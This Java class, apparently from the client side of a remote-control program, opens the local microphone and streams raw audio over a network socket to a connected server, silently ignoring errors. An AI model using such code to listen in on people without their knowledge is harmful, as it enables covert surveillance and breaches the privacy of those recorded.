package me.client.send;

import me.client.utils.MessageFlags;
import me.client.utils.SendMessage;

import javax.sound.sampled.*;
import java.net.Socket;

public class Audio extends Thread{
    TargetDataLine mic;
    Socket socket;
    public Audio(Socket socket){
        this.socket = socket;
    }
    public void open() throws Exception{
        AudioFormat audioFormat = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
        DataLine.Info info = new DataLine.Info(TargetDataLine.class, audioFormat);
        mic = (TargetDataLine) AudioSystem.getLine(info);
        mic.open();
        SendMessage.SendHead(MessageFlags.AUDIO_WINDOWS_SHOW,socket);
    }
    public void close() {
        mic.stop();
        mic.close();
    }
    @Override
    public void run() {
        try {
            mic.start();
            AudioInputStream audioInputStream = new AudioInputStream(mic);
            byte[] bytes = new byte[1024];
            int len = 0;
            while ((len = audioInputStream.read(bytes)) != -1) {
                Thread.sleep(1);
                SendMessage.Send(MessageFlags.AUDIO_DATA,bytes,socket);
            }
        }catch (Exception e) {
        }
    }
}